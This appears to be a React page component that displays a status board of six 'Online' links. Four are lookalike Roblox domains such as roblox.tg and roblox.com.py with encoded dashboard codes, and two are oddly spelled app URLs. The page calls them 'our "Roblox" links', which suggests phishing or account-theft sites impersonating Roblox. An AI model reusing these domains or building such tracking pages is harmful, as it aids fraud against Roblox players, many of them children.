import SiteCard from './components/SiteCard';

export default function Home() {
  const sites = [
    {
      title: "roblox.com.gt",
      url: "https://roblox.com.gt/dashboard/?code=NjM1MzAyODE3NTY4NTA5NzkyNg==",
      status: "Online",
      flag: "💬 💮"
    },
    {
      title: "roblox.tg",
      url: "https://roblox.tg/dashboard/?code=NjM1MzAyODE3NTY4NTA5NzkyNg==",
      status: "Online",
      flag: "💬 💮"
    },
    {
      title: "roblox.is",
      url: "https://roblox.is/dashboard/?code=NjM1MzAyODE3NTY4NTA5NzkyNg==",
      status: "Online",
      flag: "💬 💮"
    },
    {
      title: "roblox.py",
      url: "https://roblox.com.py/dashboard/?code=NjM1MzAyODE3NTY4NTA5NzkyNg==",
      status: "Online",
      flag: "💬 💮"
    },
    {
      title: "App.genn.lu",
      url: "https://app.genn.lu/auth/mainslte",
      status: "Online",
      flag: "None"
    },
    {
      title: "App.beaming.pro",
      url: "https://app.beaming.pro/u/SpIank",
      status: "Online",
      flag: "None"
    }
  ];

  return (
    <div className="min-h-screen bg-black p-4 sm:p-6 md:p-8 flex flex-col items-center">
      <header className="text-center mb-8 md:mb-12 py-6 w-full max-w-6xl">
        <h1 className="text-3xl sm:text-4xl md:text-5xl font-bold mb-4 bg-gradient-to-r from-[#a7a3ff] to-[#5d9bff] bg-clip-text text-transparent">
          Sites Page
        </h1>
        <p className="text-base sm:text-lg md:text-xl opacity-80 max-w-2xl mx-auto">
          Use this page to view all of our &quot;Roblox&quot; links and their current status.
        </p>
      </header>

      {/* Контейнер с жестким центрированием */}
      <div className="flex flex-col items-center w-full">
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 w-full max-w-6xl">
          {sites.map((site, index) => (
            <div key={index} className="flex justify-center">
              <SiteCard site={site} index={index} />
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}
